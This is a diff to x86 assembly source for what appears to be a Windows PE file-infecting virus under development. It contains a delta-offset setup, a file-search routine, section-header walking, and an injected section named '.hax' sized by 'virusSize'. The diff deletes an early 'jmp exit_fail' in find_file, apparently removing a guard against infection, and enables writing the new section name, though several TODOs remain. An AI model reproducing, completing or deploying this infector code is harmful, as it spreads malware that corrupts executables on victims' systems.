@@ -72,8 +72,6 @@ deltaoffset:
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
 
-;jmp benjamin ; For testing
-
     push    ebp ; Delta offset
     push    edi ; PE header
     push    esi ; DOS header
@@ -92,7 +90,6 @@ deltaoffset:
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 find_file:
 
-    jmp exit_fail
     ; Set up a stack frame
     push    ebp
     mov     ebp,esp
@@ -324,6 +321,12 @@ benjamin:
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 new_code_section:
 
+    nop
+    nop
+    nop
+    nop
+    nop ; debug markers
+    
     ; Set up a stack frame
     push    ebp
     mov     ebp,esp
@@ -584,7 +587,7 @@ image_section_smaller:
 
     ; Move to the next header
     mov     eax,SIZEOF IMAGE_SECTION_HEADER
-    sub     eax,16
+    sub     eax,24
     mov     ebx,[ebp+16]
     push    FILE_CURRENT
     push    0
@@ -597,10 +600,11 @@ image_section_smaller:
     dec     eax
     mov     [ebp+12],eax
     cmp     eax,0
-    jz     image_section_done
+    jz      image_section_done
 
     ; again
     jmp     image_section_loop
+
 
 image_section_done:
     ; Create new image section header !! TODO XXX
@@ -614,7 +618,7 @@ image_section_done:
     push    0 ; TODO RVA
     push    0 ; TODO Virtual size (virusSize aligned)
     push    0 ; Null padd for name
-    ;push    0x2e686178 ; name: .hax
+    push    7861682eh ; name: .hax
     mov     esi,esp ; save esp
 
     ; Write the updated number of section
